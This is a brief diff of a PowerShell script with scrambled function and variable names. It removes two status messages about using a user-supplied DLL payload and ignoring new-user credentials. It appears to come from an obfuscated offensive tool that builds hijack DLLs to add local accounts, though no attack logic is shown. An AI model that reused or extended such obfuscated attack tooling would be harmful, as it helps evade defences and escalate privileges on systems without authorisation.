@@ -30,8 +30,6 @@ function essentially
         Write-Host "[+] created payload at $DLL"
         $zqgwjUnb99 = $true
     } else {
-        Write-Host "[+] using user-supplied payload at $DLL"
-        Write-Host "[!] ignoring NewUser and NewPassword arguments"
         $zqgwjUnb99 = $false
     }
     $Mod = Colonial -ModuleName "A$(Get-Random)"
